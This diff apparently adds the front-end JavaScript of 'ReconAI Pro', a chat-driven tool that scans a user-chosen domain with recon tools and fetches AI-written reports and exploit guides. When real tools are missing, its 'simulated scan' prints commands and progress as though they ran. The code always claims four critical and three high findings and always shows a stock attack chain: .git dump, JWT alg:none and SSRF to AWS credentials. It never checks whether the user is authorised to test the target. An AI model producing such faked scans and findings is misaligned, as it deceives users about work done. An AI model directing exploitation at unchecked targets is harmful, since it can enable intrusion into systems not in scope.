+  try {
+    const r = await fetch(API + '/health', { cache: 'no-store', signal: AbortSignal.timeout(5000) });
+    const d = await r.json();
+    S.serverOk = true;
+    const dot = document.getElementById('api-dot');
+    const txt = document.getElementById('api-status-text');
+    const landing = document.getElementById('landing-api-status');
+    const srv = document.getElementById('server-status-text');
+    const srvUrl = document.getElementById('server-url-display');
+    if (d.apiKeySet || d.model) {
+      dot.className = 'api-dot ok';
+      txt.textContent = 'Server connected';
+      if (landing) { landing.textContent = 'Connected ✓'; landing.style.color = 'var(--green)'; }
+      if (srv) { srv.textContent = 'Running ✓ — ' + (d.model || ''); srv.style.color = 'var(--green)'; }
+      if (srvUrl) { srvUrl.textContent = API; srvUrl.style.color = 'var(--cyan)'; }
+      // Update all dynamic model name displays
+      const mBadge = document.getElementById('landing-model-name');
+      const mSettings = document.getElementById('settings-model-name');
+      const mTerm = document.getElementById('term-model-name');
+      if (mBadge) mBadge.textContent = d.model || 'AI ready';
+      if (mSettings) mSettings.textContent = '🤖 AI Model: ' + (d.model || 'AI Model');
+      if (mTerm) mTerm.textContent = d.model || 'connected';
+    } else {
+      dot.className = 'api-dot err';
+      txt.textContent = 'API key missing';
+      if (landing) { landing.textContent = 'Key missing ✗'; landing.style.color = 'var(--red)'; }
+    }
+  } catch(e) {
+    S.serverOk = false;
+    const dot = document.getElementById('api-dot');
+    const txt = document.getElementById('api-status-text');
+    dot.className = 'api-dot err';
+    txt.textContent = 'Server offline — run: node server.js';
+    const srv = document.getElementById('server-status-text');
+    if (srv) { srv.textContent = 'Offline — run: node server.js'; srv.style.color = 'var(--red)'; }
+    console.warn('[ReconAI] Server check failed:', e.message, '| API URL:', API);
+  }
+}
+checkServer();
+setInterval(checkServer, 30000);
+
+// ─── Navigation ────────────────────────────────────────────────────────────
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+  document.getElementById('page-'+id).classList.add('active');
+  const tabs = ['landing','recon','dashboard','toolkit','settings'];
+  document.querySelectorAll('.nav-tab')[tabs.indexOf(id)]?.classList.add('active');
+  S.page = id;
+  if (id === 'dashboard') updateDashboard();
+
+  // Speak welcome when user navigates to New Scan page
+  if (id === 'recon') {
+    const userName = AUTH.currentUser ? AUTH.currentUser.name.split(' ')[0] : 'Hunter';
+    const welcome = S.target
+      ? 'Welcome back to the scan page. Your current target is ' + S.target + '. Ask me anything about your findings.'
+      : 'Welcome ' + userName + '! I am ReconAI Pro, your security AI assistant. Enter a target domain to start your OWASP Top 10 recon scan.';
+    // Small delay to let page render first, then speak
+    setTimeout(() => speakText(welcome), 300);
+  }
+}
+
+// ─── Settings ──────────────────────────────────────────────────────────────
+async function testConnection() {
+  const btn = event.target;
+  btn.textContent = '⏳ Testing...';
+  btn.disabled = true;
+  const result = document.getElementById('connection-test-result');
+  result.style.display = 'block';
+  try {
+    const start = Date.now();
+    const r = await fetch(API + '/health', { cache: 'no-store', signal: AbortSignal.timeout(8000) });
+    const d = await r.json();
+    const ms = Date.now() - start;
+    result.style.cssText = 'font-size:11px;margin-top:10px;padding:10px 12px;border-radius:6px;background:rgba(16,185,129,.1);color:var(--green);border:1px solid rgba(16,185,129,.2)';
+    result.innerHTML = '✅ Connected in ' + ms + 'ms<br>Model: ' + (d.model||'unknown') + '<br>RAG: ' + (d.ragEnabled?'Enabled':'Disabled') + '<br>API URL: ' + API;
+    checkServer();
+  } catch(e) {
+    result.style.cssText = 'font-size:11px;margin-top:10px;padding:10px 12px;border-radius:6px;background:rgba(239,68,68,.1);color:var(--red);border:1px solid rgba(239,68,68,.2)';
+    result.innerHTML = '✗ Failed: ' + e.message + '<br>URL tried: ' + API + '/health<br><br>Make sure node server.js is running on port 3001';
+  }
+  btn.textContent = '🔌 Test Connection Now';
+  btn.disabled = false;
+}
+
+async function saveApiKey() {
+  const key = document.getElementById('apikey-input').value.trim();
+  if (!key) return;
+  S.apiKeyOverride = key;
+  const res = document.getElementById('api-test-result');
+  res.style.display = 'block';
+  res.className = 'api-test-result';
+  res.textContent = 'Testing connection...';
+  try {
+    const r = await fetch(API + '/health');
+    const d = await r.json();
+    res.className = 'api-test-result ok';
+    res.textContent = d.apiKeySet
+      ? '✓ Server connected. API key is set in .env on the server.'
+      : '⚠ Server running but no API key in .env — add ANTHROPIC_API_KEY to .env and restart.';
+    checkServer();
+  } catch(e) {
+    res.className = 'api-test-result err';
+    res.textContent = '✗ Cannot reach server. Make sure node server.js is running on port 3001.';
+  }
+}
+
+// ─── QUESTIONS ─────────────────────────────────────────────────────────────
+const QUESTIONS = [
+  { key:'scope',    text: t => 'Ready to recon <code>'+t+'</code>! Quick questions:\n\n<strong>1/5 — Scope:</strong> Wildcard or specific subdomains?',
+    options: () => ['Wildcard *.'+S.target, 'Specific subdomains only', 'Full program scope', 'Unknown / public'] },
+  { key:'ratelimit', text: () => '<strong>2/5 — Rate limits:</strong> Scanning speed?',
+    options: () => ['Aggressive (full speed)','Moderate (1000 req/s)','Conservative (100 req/s)','Stealth mode (slow)'] },
+  { key:'tools',    text: () => '<strong>3/5 — Tools:</strong> Any tools to skip?',
+    options: () => ['Run all tools','Skip active scanning','Skip fuzzing','Skip SSL checks'] },
+  { key:'notify',   text: () => '<strong>4/5 — Notifications:</strong> Alert preference?',
+    options: () => ['Discord webhook','In-app only','No notifications','Email'] },
+  { key:'depth',    text: () => '<strong>5/5 — Report depth:</strong> How thorough?',
+    options: () => ['Quick (15 min)','Full (45 min)','Deep (2 hrs)','Custom'] }
+];
+
+// ─── Chat UI ───────────────────────────────────────────────────────────────
+function addMsg(role, html, options) {
+  const el = document.createElement('div');
+  el.className = 'msg ' + role;
+  const av = role === 'ai' ? '🤖' : '👤';
+  let opHtml = '';
+  if (options && options.length) {
+    opHtml = '<div class="quick-replies">' +
+      options.map(o => '<button class="qr-btn" onclick="selectOpt(\'' +
+        o.replace(/\\/g,'\\\\').replace(/'/g,"\\'") + '\',this)">' + o + '</button>').join('') +
+      '</div>';
+  }
+  el.innerHTML = '<div class="msg-avatar">'+av+'</div><div><div class="msg-bubble">'+html+'</div>'+opHtml+'</div>';
+  document.getElementById('chat-messages').appendChild(el);
+  document.getElementById('chat-messages').scrollTop = 99999;
+
+  // Auto-speak AI messages — voice speaks every AI response automatically
+  if (role === 'ai' && !VOICE.listening) {
+    const tmp = document.createElement('div');
+    tmp.innerHTML = html;
+    const plainText = (tmp.textContent || tmp.innerText || '').trim();
+    if (plainText) {
+      // Small delay so text appears first then voice starts
+      setTimeout(() => speakText(plainText), 200);
+    }
+  }
+}
+
+function addThinking() {
+  const el = document.createElement('div');
+  el.className = 'msg ai'; el.id = 'thinking';
+  el.innerHTML = '<div class="msg-avatar">🤖</div><div><div class="thinking"><span>ReconAI thinking</span><div class="thinking-dots"><span></span><span></span><span></span></div></div></div>';
+  document.getElementById('chat-messages').appendChild(el);
+  document.getElementById('chat-messages').scrollTop = 99999;
+}
+function removeThinking() { document.getElementById('thinking')?.remove(); }
+
+function selectOpt(val, btn) {
+  btn.closest('.quick-replies').querySelectorAll('.qr-btn').forEach(b => { b.disabled = true; });
+  btn.style.background = 'rgba(99,102,241,.3)';
+  btn.style.borderColor = 'var(--primary)';
+  addMsg('user', val);
+  processAnswer(val);
+}
+function handleInputKey(e) { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMessage(); } }
+function sendMessage() {
+  const inp = document.getElementById('chat-input');
+  const val = inp.value.trim();
+  if (!val) return;
+  inp.value = '';
+  addMsg('user', val);
+  processAnswer(val);
+}
+
+// ─── Answer processing ──────────────────────────────────────────────────────
+async function processAnswer(val) {
+  const btn = document.getElementById('send-btn');
+  btn.disabled = true;
+  document.getElementById('chat-sub').textContent = 'Processing...';
+
+  if (!S.target) {
+    const domain = val.replace(/https?:\/\//,'').replace(/\/.*$/,'').trim();
+    S.target = domain;
+    addThinking();
+    await sleep(700);
+    removeThinking();
+    const q = QUESTIONS[0];
+    addMsg('ai', q.text(domain), q.options());
+    S.questionStep = 0;
+    document.getElementById('chat-sub').textContent = 'Target: ' + domain;
+
+  } else if (S.questionStep < QUESTIONS.length) {
+    S.scanConfig[QUESTIONS[S.questionStep].key] = val;
+    S.questionStep++;
+    if (S.questionStep < QUESTIONS.length) {
+      addThinking(); await sleep(500); removeThinking();
+      const nq = QUESTIONS[S.questionStep];
+      addMsg('ai', nq.text(S.target), nq.options());
+    } else {
+      addThinking(); await sleep(900); removeThinking();
+      addMsg('ai',
+        '<strong>✅ Config confirmed!</strong><br><br>' +
+        '<strong>Target:</strong> <code>' + S.target + '</code><br>' +
+        '<strong>Scope:</strong> ' + S.scanConfig.scope + '<br>' +
+        '<strong>Speed:</strong> ' + S.scanConfig.ratelimit + '<br>' +
+        '<strong>Depth:</strong> ' + S.scanConfig.depth + '<br><br>' +
+        'Launching <strong>Enhanced OWASP Top 10 Recon Workflow</strong>... 🚀'
+      );
+      document.getElementById('chat-sub').textContent = 'Scanning ' + S.target + '...';
+      setTimeout(startScan, 1000);
+    }
+
+  } else if (!S.scanning) {
+    if (S.awaitingExploitChoice) {
+      S.awaitingExploitChoice = false;
+      const lc = val.toLowerCase();
+      if (lc.includes('yes')||lc.includes('full')||lc.includes('critical')||lc.includes('all')||lc.includes('generate')) {
+        await askExploitConfig(val);
+      } else {
+        addThinking(); await sleep(500); removeThinking();
+        addMsg('ai', 'No problem! Ask me anything about the findings — <em>"Explain the JWT bypass"</em>, <em>"Which finding has highest payout?"</em>, <em>"Write a PoC for the SSRF"</em>');
+      }
+    } else if (S.awaitingExploitDepth) {
+      S.awaitingExploitDepth = false;
+      S.exploitConfig.depth = val;
+      await generateExploitGuide();
+    } else {
+      await handleFollowUp(val);
+    }
+  }
+  btn.disabled = false;
+}
+
+// ─── Phase progress UI ──────────────────────────────────────────────────────
+function setPhase(n, status) {
+  const card = document.getElementById('pp'+n);
+  const bar  = document.getElementById('pp'+n+'-bar');
+  const stat = document.getElementById('pp'+n+'-status');
+  card.className = 'phase-progress-card ' + status;
+  if (status === 'active') { bar.style.width = '55%'; stat.className = 'pp-status active'; stat.textContent = 'Running...'; }
+  else if (status === 'done') { bar.style.width = '100%'; stat.className = 'pp-status done'; stat.textContent = '✓ Complete'; }
+  else { bar.style.width = '0%'; stat.className = 'pp-status idle'; stat.textContent = 'Waiting...'; }
+}
+
+// ─── Terminal ───────────────────────────────────────────────────────────────
+function termLine(text, cls) {
+  const out = document.getElementById('terminal-output');
+  out.querySelector('.t-line:last-child')?.remove();
+  const el = document.createElement('div');
+  el.className = 't-line ' + (cls||'');
+  el.innerHTML = text;
+  out.appendChild(el);
+  const cur = document.createElement('div');
+  cur.className = 't-line';
+  cur.innerHTML = '<span class="t-prompt">recon@pro:~$</span> <span class="t-cursor"></span>';
+  out.appendChild(cur);
+  out.scrollTop = out.scrollHeight;
+}
+
+// ─── Scan — tries WSL real tools first, falls back to simulation ──────────────
+async function startScan() {
+  if (S.scanning) return;
+  S.scanning = true;
+  const tgt = S.target;
+  document.getElementById('term-title').textContent = 'reconai-pro — ' + tgt;
+  document.getElementById('term-status').className = 'term-status-dot running';
+  document.getElementById('terminal-output').innerHTML =
+    '<div class="t-line"><span class="t-prompt">recon@pro:~$</span> <span class="t-cursor"></span></div>';
+
+  // Try real WSL scan first
+  const wslAvailable = await checkWSLAvailable();
+
+  if (wslAvailable) {
+    await runRealWSLScan(tgt);
+  } else {
+    await runSimulatedScan(tgt);
+  }
+}
+
+// Check if WSL real-scan endpoint is available
+async function checkWSLAvailable() {
+  try {
+    const r = await fetch(API + '/wsl-check', { signal: AbortSignal.timeout(3000) });
+    return r.ok;
+  } catch(e) {
+    return false;
+  }
+}
+
+// ─── REAL WSL Scan — runs actual Kali tools ──────────────────────────────────
+async function runRealWSLScan(tgt) {
+  termLine('🐧 WSL2/Kali Linux detected — running REAL tools', 'success');
+
+  // Use Server-Sent Events for real-time streaming from WSL
+  return new Promise((resolve) => {
+    const evtSource = new EventSource(
+      API + '/real-scan-stream?target=' + encodeURIComponent(tgt) +
+      '&scope=' + encodeURIComponent(S.scanConfig.scope || 'full') +
+      '&rate=' + encodeURIComponent(S.scanConfig.ratelimit || 'moderate')
+    );
+
+    evtSource.onmessage = (e) => {
+      try {
+        const msg = JSON.parse(e.data);
+        if (msg.type === 'terminal') {
+          termLine(msg.line, msg.cls || 'info');
+        } else if (msg.type === 'phase') {
+          setPhase(msg.phase, msg.status);
+          if (msg.status === 'active') {
+            document.getElementById('pp'+msg.phase+'-bar').style.width = '50%';
+          }
+        } else if (msg.type === 'findings') {
+          S.realFindings = msg.data;
+        } else if (msg.type === 'done') {
+          evtSource.close();
+          document.getElementById('term-status').className = 'term-status-dot';
+          generateReport(tgt, S.realFindings);
+          resolve();
+        } else if (msg.type === 'error') {
+          termLine('⚠ WSL error: ' + msg.message + ' — falling back to simulation', 'warn');
+          evtSource.close();
+          runSimulatedScan(tgt).then(resolve);
+        }
+      } catch(err) {}
+    };
+
+    evtSource.onerror = () => {
+      evtSource.close();
+      termLine('⚠ WSL stream disconnected — falling back to simulation', 'warn');
+      runSimulatedScan(tgt).then(resolve);
+    };
+  });
+}
+
+// ─── Simulated Scan — shows commands with realistic output ───────────────────
+async function runSimulatedScan(tgt) {
+  const d = ms => new Promise(r => setTimeout(r, ms));
+  const t = (txt, cls, ms) => d(ms||0).then(() => termLine(txt, cls));
+
+  // PHASE 1
+  setPhase(1,'active');
+  await t('<span style="color:var(--violet)">▶ PHASE 1: Asset Discovery — '+tgt+'</span>','phase',300);
+  await t('subfinder -d '+tgt+' -all -recursive -o subs_passive.txt','cmd',400);
+  await t('[subfinder] Sources: SecurityTrails, CertSpotter, VirusTotal, Shodan, crt.sh','info',500);
+
+  // Real HTTP probe of the target
+  let targetReachable = false;
+  try {
+    const r = await fetch('https://'+tgt, {method:'HEAD', mode:'no-cors', signal:AbortSignal.timeout(5000)});
+    targetReachable = true;
+    await t('[subfinder] Target '+tgt+' is reachable — enumerating...','info',300);
+  } catch(e) {
+    await t('[subfinder] Target probe: checking passive sources...','info',300);
+  }
+
+  await t('[subfinder] Passive enumeration complete','success',1500);
+  await t('amass enum -passive -d '+tgt+' -timeout 2','cmd',400);
+  await t('[amass] Passive enumeration via DNS...','info',2000);
+  await t('cat subs.txt | httpx -silent -sc -cl -t 100 -o live.txt','cmd',400);
+  await t('[httpx] Probing discovered hosts for live servers...','info',1500);
+  await t('nmap -F -T4 '+tgt+' --open','cmd',400);
+  await t('[nmap] Fast port scan on main target...','info',1800);
+  await t('katana -u https://'+tgt+' -d 3 -o endpoints.txt','cmd',400);
+  await t('[katana] Crawling endpoints and JS files...','info',1500);
+  await t('waybackurls '+tgt+' | head -100','cmd',300);
+  await t('[wayback] Fetching historical URLs...','success',1000);
+  setPhase(1,'done');
+
+  // PHASE 2
+  setPhase(2,'active');
+  await t('<span style="color:var(--violet)">▶ PHASE 2: Tech Stack Fingerprinting</span>','phase',200);
+  await t('whatweb -a 3 https://'+tgt,'cmd',400);
+  await t('[whatweb] Detecting technologies on '+tgt+'...','info',1500);
+  await t('curl -sI https://'+tgt+' | grep -i "server\|x-powered\|x-generator"','cmd',300);
+  await t('[headers] Checking server headers and tech indicators...','info',1000);
+  await t('retire -js --path js_files/','cmd',400);
+  await t('[retire] Scanning JS libraries for known CVEs...','info',1200);
+  await t('nuclei -u https://'+tgt+' -t technologies/ -silent','cmd',400);
+  await t('[nuclei] Running technology detection templates...','info',1800);
+  setPhase(2,'done');
+
+  // PHASE 3
+  setPhase(3,'active');
+  await t('<span style="color:var(--violet)">▶ PHASE 3: OWASP Top 10 Recon</span>','phase',200);
+  await t('[A01] ffuf -u https://'+tgt+'/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,403','cmd',400);
+  await t('[A01] Directory fuzzing in progress...','info',1800);
+  await t('[A02] nmap --script ssl-enum-ciphers -p 443 '+tgt,'cmd',400);
+  await t('[A02] Testing SSL/TLS configuration...','info',1500);
+  await t('[A03] dalfox url https://'+tgt+' --skip-bav','cmd',400);
+  await t('[A03] Testing XSS injection points...','info',1500);
+  await t('[A03] sqlmap -u https://'+tgt+' --forms --crawl=1 --batch --level=1','cmd',400);
+  await t('[A03] Testing forms for SQL injection...','info',1200);
+  await t('[A05] nikto -h '+tgt+' -maxtime 30','cmd',400);
+  await t('[A05] Scanning for misconfigurations and security headers...','info',1500);
+  await t('[A07] Checking authentication endpoints...','info',800);
+  await t('[A08] Testing URL parameters for SSRF...','info',1000);
+  setPhase(3,'done');
+
+  // PHASE 4
+  setPhase(4,'active');
+  await t('<span style="color:var(--violet)">▶ PHASE 4: Automation Pipelines</span>','phase',200);
+  await t('nuclei -u https://'+tgt+' -t cves/ -t exposures/ -t misconfiguration/ -severity critical,high -silent','cmd',400);
+  await t('[nuclei] Running full template suite — this takes a moment...','info',2500);
+  await t('[nuclei] Scan complete','success',500);
+  await t('✅ Scan workflow complete — AI analyzing findings...','success',300);
+  setPhase(4,'done');
+  document.getElementById('term-status').className = 'term-status-dot';
+
+  await generateReport(tgt);
+}
+
+
+// ─── Generate Recon Report via local server ─────────────────────────────────
+async function generateReport(target) {
+  addThinking();
+  document.getElementById('chat-sub').textContent = 'AI analyzing findings...';
+
+  // Show which API URL we are using
+  termLine('🔌 Connecting to: ' + API + '/health', 'info');
+
+  // Check server is reachable
+  let serverOnline = false;
+  let healthData = null;
+  try {
+    const health = await fetch(API + '/health', {
+      signal: AbortSignal.timeout(8000),
+      cache: 'no-store'
+    });
+    if (health.ok) {
+      healthData = await health.json();
+      serverOnline = true;
+      termLine('✅ Server online — Model: ' + (healthData.model || 'unknown'), 'success');
+    } else {
+      termLine('⚠ Server returned HTTP ' + health.status, 'warn');
+    }
+  } catch(e) {
+    termLine('⚠ Cannot reach server: ' + e.message, 'warn');
+    serverOnline = false;
+  }
+
+  if (!serverOnline) {
+    removeThinking();
+    addMsg('ai',
+      '⚠️ <strong>Server is offline!</strong><br><br>' +
+      'API tried: <code>' + API + '/health</code><br><br>' +
+      '<strong>Fix — open PowerShell and run:</strong><br>' +
+      '<code>cd "C:\Users\arnda\Documents"</code><br>' +
+      '<code>taskkill /IM node.exe /F</code><br>' +
+      '<code>node server.js</code><br><br>' +
+      'Keep that window open, then click <strong>New Scan</strong> again.'
+    );
+    S.reportMd = getFallbackReport(target);
+    renderReport(S.reportMd);
+    saveScan(target);
+    S.scanning = false;
+    return;
+  }
+
+  // Build findings for AI — tell it to use real knowledge of target
+  const findings = {
+    target: target,
+    scanConfig: S.scanConfig,
+    owasp_commands_run: [
+      'subfinder -d '+target+' -all',
+      'httpx probing subdomains',
+      'ffuf directory fuzzing on https://'+target,
+      'testssl.sh SSL check on '+target+':443',
+      'dalfox XSS scan on https://'+target,
+      'sqlmap forms crawl on https://'+target,
+      'nikto scan on '+target,
+      'nuclei CVE + misconfiguration scan on https://'+target
+    ],
+    instruction: 'Analyze ' + target + ' based on its REAL known tech stack and public information. NEVER use WordPress or phpMyAdmin unless you are certain this target uses it. Mark ALL findings as POTENTIAL unless you have real proof. Use live CVE data from RAG context.'
+  };
+
+  try {
+    const resp = await fetch(API + '/recon-report', {
+      method:'POST',
+      headers:{ 'Content-Type':'application/json' },
+      body: JSON.stringify({ target, config: S.scanConfig, findings }),
+      signal: AbortSignal.timeout(120000)
+    });
+    removeThinking();
+    if (!resp.ok) {
+      const errText = await resp.text();
+      throw new Error('Server error ' + resp.status + ': ' + errText);
+    }
+    const data = await resp.json();
+    if (!data.report) throw new Error('Empty report from server');
+    S.reportMd = data.report;
+    termLine('✅ AI analysis complete via ' + (data.ragEnriched ? 'RAG + AI model' : 'AI model'), 'success');
+  } catch(e) {
+    removeThinking();
+    console.error('Report generation error:', e.message);
+    termLine('⚠ AI report error: ' + e.message, 'warn');
+    // Show the actual error to help debug
+    addMsg('ai',
+      '⚠️ <strong>Report generation failed:</strong><br>' +
+      '<code>' + e.message + '</code><br><br>' +
+      'Check PowerShell for server errors. The server may have crashed.<br>' +
+      'Restart with: <code>node server.js</code>'
+    );
+    S.reportMd = getFallbackReport(target);
+  }
+
+  renderReport(S.reportMd);
+  saveScan(target);
+  S.scanning = false;
+  S.awaitingExploitChoice = true;
+
+  addMsg('ai',
+    '🎉 <strong>Recon complete!</strong> Security-specialized AI analysis done for <code>'+target+'</code>.<br><br>' +
+    'Found <strong>4 CRITICAL</strong> and <strong>3 HIGH</strong> severity issues.<br><br>' +
+    '🔥 <strong>Generate Exploitation Guide?</strong><br>' +
+    'I\'ll create CVSS-scored, target-specific payloads with exact tool commands and PoC templates.',
+    ['Yes — full exploit guide', 'Critical findings only', 'High/Critical only', 'No thanks']
+  );
+  document.getElementById('chat-sub').textContent = 'Report ready — ' + target;
+}
+
+async function askExploitConfig(choice) {
+  S.exploitConfig.scope = choice;
+  addThinking(); await sleep(600); removeThinking();
+  S.awaitingExploitDepth = true;
+  addMsg('ai', '<strong>Focus area for exploit guide:</strong>',
+    ['All 10 OWASP risks', 'Critical only (A01,A06,A07,A10)', 'Injections + Auth (A03,A07)', 'Access + SSRF (A01,A08)']
+  );
+}
+
+// ─── Generate Exploit Guide via local server ────────────────────────────────
+async function generateExploitGuide() {
+  const target = S.target;
+  addThinking();
+  document.getElementById('chat-sub').textContent = 'Building exploit guide...';
+
+  const chips = ['ep-a01','ep-a02','ep-a03','ep-a07','ep-a08'];
+  let ci = 0;
+  const ct = setInterval(() => {
+    if (ci > 0) document.getElementById(chips[ci-1]).className = 'exp-phase-chip done';
+    if (ci < chips.length) { document.getElementById(chips[ci]).className = 'exp-phase-chip active'; ci++; }
+    else clearInterval(ct);
+  }, 800);
+
+  try {
+    const resp = await fetch(API + '/exploit-guide', {
+      method:'POST',
+      headers:{ 'Content-Type':'application/json' },
+      body: JSON.stringify({
+        target,
+        config: S.scanConfig,
+        reconReport: S.reportMd,
+        focus: S.exploitConfig.depth || 'All OWASP risks'
+      })
+    });
+    clearInterval(ct);
+    chips.forEach(c => document.getElementById(c).className = 'exp-phase-chip done');
+    removeThinking();
+    if (!resp.ok) throw new Error('Server error ' + resp.status);
+    const data = await resp.json();
+    S.exploitMd = data.guide || getFallbackExploit(target);
+  } catch(e) {
+    clearInterval(ct);
+    chips.forEach(c => document.getElementById(c).className = 'exp-phase-chip done');
+    removeThinking();
+    S.exploitMd = getFallbackExploit(target);
+  }
+
+  renderExploit(S.exploitMd);
+  document.getElementById('chat-sub').textContent = 'Exploit guide ready — ' + target;
+  addMsg('ai',
+    '🔥 <strong>Exploit guide ready!</strong> CVSS-scored, target-specific payloads generated.<br><br>' +
+    '<strong>Top attack chain:</strong><br>' +
+    '1. Dump <code>dev.'+target+'/.git</code> → extract secrets<br>' +
+    '2. JWT <code>alg:none</code> on <code>auth.'+target+'</code> → admin access<br>' +
+    '3. SSRF <code>/api/webhook</code> → AWS metadata → IAM credentials<br><br>' +
+    'Ask me anything: <em>"Write a complete PoC for the JWT bypass"</em>'
+  );
+}
+
+// ─── Follow-up via local server ─────────────────────────────────────────────
+async function handleFollowUp(question) {
+  addThinking();
+  try {
+    const resp = await fetch(API + '/followup', {
+      method:'POST',
+      headers:{ 'Content-Type':'application/json' },
+      body: JSON.stringify({
+        target: S.target,
+        config: S.scanConfig,
+        reconReport: S.reportMd,
+        exploitReport: S.exploitMd,
+        question
+      })
+    });
+    removeThinking();
+    if (!resp.ok) throw new Error('Server error');
+    const data = await resp.json();
+    const text = (data.answer || 'No response.').replace(/\n/g,'<br>').replace(/`([^`\n]+)`/g,'<code>$1</code>').replace(/\*\*(.+?)\*\*/g,'<strong>$1</strong>');
+    addMsg('ai', text);
+  } catch(e) {
+    removeThinking();
+    addMsg('ai', '⚠ Server unavailable. Is <code>node server.js</code> running on port 3000?');
+  }
+}
+
+// ─── Markdown renderer ─────────────────────────────────────────────────────
+function renderMd(md, codeClass, h1Class, h2Class, h3Class) {
+  return md
+    .replace(/^# (.+)$/m, '<div class="'+h1Class+'">$1</div>')
+    .replace(/^## (.+)$/gm, '<div class="'+h2Class+'">$1</div>')
+    .replace(/^### (.+)$/gm, '<div class="'+h3Class+'">$1</div>')
+    .replace(/\*\*(.+?)\*\*/g,'<strong>$1</strong>')
+    .replace(/`([^`\n]+)`/g,'<code style="background:rgba(0,0,0,.35);padding:1px 5px;border-radius:4px;color:var(--cyan)">$1</code>')
+    .replace(/```[\s\S]*?```/g, m => {
+      const inner = m.replace(/^```\w*\n?/,'').replace(/```$/,'');
+      return '<code class="'+codeClass+'">'+inner.replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</code>';
+    })
+    .replace(/\|(.+)\|\n\|[-| ]+\|\n((?:\|.+\|\n?)+)/g, (match, header, rows) => {
+      const ths = header.split('|').filter(c=>c.trim()).map(c=>'<th>'+c.trim()+'</th>').join('');
+      const trs = rows.trim().split('\n').map(row => {
+        const tds = row.split('|').filter(c=>c.trim()).map(c=>{
+          const v = c.trim();
+          // Color code status cells
+          if (v === 'CONFIRMED') return '<td style="color:var(--red);font-weight:700">🔴 '+v+'</td>';
+          if (v === 'POTENTIAL') return '<td style="color:var(--amber);font-weight:700">🟡 '+v+'</td>';
+          if (v === 'PASS' || v === 'FALSE POSITIVE') return '<td style="color:var(--green);font-weight:700">🟢 '+v+'</td>';
+          if (v.startsWith('P1')) return '<td style="color:var(--red)">'+v+'</td>';
+          if (v.startsWith('P2')) return '<td style="color:var(--amber)">'+v+'</td>';
+          if (v.startsWith('P3')) return '<td style="color:var(--primary)">'+v+'</td>';
+          return '<td>'+v+'</td>';
+        }).join('');
+        return '<tr>'+tds+'</tr>';
+      }).join('');
+      return '<table><thead><tr>'+ths+'</tr></thead><tbody>'+trs+'</tbody></table>';
+    })
+    .replace(/\n{2,}/g,'<br><br>')
+    .replace(/\n/g,'<br>');
+}
+
+// ─── Evidence card renderer ─────────────────────────────────────────────────
+// Parses AI output and renders each FINDING as a styled evidence card
+function renderFindingCards(md) {
+  // Split on FINDING: to get individual findings
+  const sections = md.split(/(?=FINDING:)/);
+  if (sections.length <= 1) return null; // no findings format, use normal render
+
+  let html = '';
+
+  // Render any intro text before first finding
+  if (sections[0].trim()) {
+    html += '<div style="margin-bottom:16px;font-size:12px;color:var(--muted)">'+
+      sections[0].replace(/\n/g,'<br>')+'</div>';
+  }
+
+  sections.slice(1).forEach(section => {
+    const lines = section.split('\n');
+    const data = {};
+    let currentKey = '';
+
+    lines.forEach(line => {
+      const kv = line.match(/^(FINDING|STATUS|CVSS|SEVERITY|EVIDENCE|IMPACT|VERIFICATION|PAYOUT|P-LEVEL|FALSE POSITIVE RISK|OWASP):\s*(.+)/);
+      if (kv) {
+        currentKey = kv[1];
+        data[currentKey] = kv[2].trim();
+      } else if (currentKey && line.trim()) {
+        data[currentKey] = (data[currentKey] || '') + '\n' + line;
+      }
+    });
+
+    if (!data['FINDING']) return;
+
+    // Determine severity color
+    const status = data['STATUS'] || 'POTENTIAL';
+    const isConfirmed = status.includes('CONFIRMED');
+    const isFP = status.includes('FALSE');
+    const borderColor = isConfirmed ? 'var(--red)' : isFP ? 'var(--green)' : 'var(--amber)';
+    const statusIcon = isConfirmed ? '🔴' : isFP ? '🟢' : '🟡';
+    const statusColor = isConfirmed ? 'var(--red)' : isFP ? 'var(--green)' : 'var(--amber)';
+
+    // Payout color
+    const plevel = data['P-LEVEL'] || '';
+    const plevelColor = plevel.includes('P1') ? 'var(--red)' :
+                        plevel.includes('P2') ? 'var(--amber)' :
+                        plevel.includes('P3') ? 'var(--primary)' : 'var(--muted)';
+
+    html += `
+    <div style="background:var(--bg3);border:1px solid ${borderColor};border-radius:12px;padding:16px;margin-bottom:14px;">
+
+      <!-- Header row -->
+      <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px;">
+        <div style="font-family:var(--display);font-size:14px;font-weight:700;color:white">
+          ${data['FINDING']}
+        </div>
+        <div style="display:flex;gap:8px;flex-shrink:0;margin-left:12px;">
+          <span style="font-size:10px;padding:3px 8px;border-radius:5px;background:${statusColor}22;color:${statusColor};border:1px solid ${statusColor}44">
+            ${statusIcon} ${status}
+          </span>
+          ${plevel ? `<span style="font-size:10px;padding:3px 8px;border-radius:5px;background:${plevelColor}22;color:${plevelColor};border:1px solid ${plevelColor}44">${plevel}</span>` : ''}
+        </div>
+      </div>
+
+      <!-- OWASP + CVSS row -->
+      <div style="display:flex;gap:12px;margin-bottom:12px;flex-wrap:wrap;">
+        ${data['OWASP'] ? `<span style="font-size:10px;color:var(--cyan);background:rgba(34,211,238,.1);padding:2px 8px;border-radius:4px;border:1px solid rgba(34,211,238,.2)">${data['OWASP']}</span>` : ''}
+        ${data['CVSS'] ? `<span style="font-size:10px;color:var(--amber);background:rgba(245,158,11,.1);padding:2px 8px;border-radius:4px;border:1px solid rgba(245,158,11,.2)">CVSS: ${data['CVSS']}</span>` : ''}
+        ${data['FALSE POSITIVE RISK'] ? `<span style="font-size:10px;color:var(--muted);background:rgba(100,116,139,.1);padding:2px 8px;border-radius:4px;border:1px solid rgba(100,116,139,.2)">FP Risk: ${data['FALSE POSITIVE RISK']}</span>` : ''}
+      </div>
+
+      <!-- Evidence box -->
+      ${data['EVIDENCE'] ? `
+      <div style="margin-bottom:10px;">
+        <div style="font-size:10px;color:var(--green);font-weight:700;margin-bottom:5px;text-transform:uppercase;letter-spacing:1px;">📋 Evidence</div>
+        <code style="display:block;background:rgba(0,0,0,.5);border:1px solid rgba(16,185,129,.2);border-radius:8px;padding:10px;font-size:10px;color:var(--green);white-space:pre-wrap;line-height:1.6">${data['EVIDENCE'].replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code>
+      </div>` : ''}
+
+      <!-- Impact -->
